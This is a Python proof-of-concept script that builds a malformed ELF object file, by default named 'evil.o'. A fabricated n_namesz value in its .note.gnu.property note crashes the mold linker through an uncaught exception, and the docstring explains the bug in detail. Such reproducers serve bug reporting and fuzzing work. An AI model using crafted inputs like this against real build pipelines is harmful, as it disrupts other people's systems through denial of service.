#!/usr/bin/env python3
"""Writes a minimal x86_64 ET_REL ELF object with one ".note.gnu.property" section
containing a single malformed ELF note record whose n_namesz field is a huge,
entirely fabricated value.

mold's ObjectFile<E>::parse_note_gnu_property() (src/input-files.cc) reads the
note header unconditionally and then does:

    data = data.substr(align_to(hdr.n_namesz, 4));

using the single-argument std::string_view::substr(pos) overload, which THROWS
std::out_of_range when pos exceeds the view's size (unlike the two-argument
substr(pos, count) overload used a couple of lines earlier for the same field,
which clamps instead of throwing). mold has no top-level exception handler
anywhere in its input-parsing pipeline, so this reaches std::terminate() ->
SIGABRT.

The section itself is entirely well-formed as far as mold's own get_string()
bounds check is concerned (sh_offset/sh_size both point at real, in-file bytes) -
only the note record's *internal* n_namesz field lies about how much data
follows it.
"""
import struct
import sys


def build() -> bytes:
    e_ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8  # ELFCLASS64, ELFDATA2LSB

    # One ElfNhdr: n_namesz (huge, fabricated), n_descsz=0, n_type=5 (NT_GNU_PROPERTY_TYPE_0).
    # No name/desc bytes follow - the crash happens while skipping past the (lying) name
    # field, before any name/desc content is ever read.
    note_data = struct.pack("<III", 0xFFFFFFF0, 0, 5)

    shstrtab = b"\x00.note.gnu.property\x00.shstrtab\x00"
    name_note = 1
    name_shstrtab = 1 + len(".note.gnu.property") + 1

    off_note = 64
    off_shstrtab = off_note + len(note_data)
    off_shdrs = off_shstrtab + len(shstrtab)
    pad = (-off_shdrs) % 8
    off_shdrs += pad

    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,   # e_type = ET_REL
        62,  # e_machine = EM_X86_64
        1,   # e_version
        0,   # e_entry
        0,   # e_phoff
        off_shdrs,  # e_shoff
        0,   # e_flags
        64,  # e_ehsize
        0,   # e_phentsize
        0,   # e_phnum
        64,  # e_shentsize
        3,   # e_shnum
        2,   # e_shstrndx
    )
    assert len(ehdr) == 64

    def shdr(name, type_, flags, offset, size):
        return struct.pack("<IIQQQQIIQQ", name, type_, flags, 0, offset, size, 0, 0, 1, 0)

    sh_null = shdr(0, 0, 0, 0, 0)
    # SHT_NOTE=7, no SHF_ALLOC needed - mold dispatches to parse_note_gnu_property purely
    # by section *name*, not by sh_type (see src/input-files.cc, the `if (name ==
    # ".note.gnu.property")` check).
    sh_note = shdr(name_note, 7, 0, off_note, len(note_data))
    sh_shstrtab = shdr(name_shstrtab, 3, 0, off_shstrtab, len(shstrtab))  # SHT_STRTAB

    return ehdr + note_data + shstrtab + b"\x00" * pad + sh_null + sh_note + sh_shstrtab


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.o"
    with open(out_path, "wb") as f:
        f.write(build())


if __name__ == "__main__":
    main()
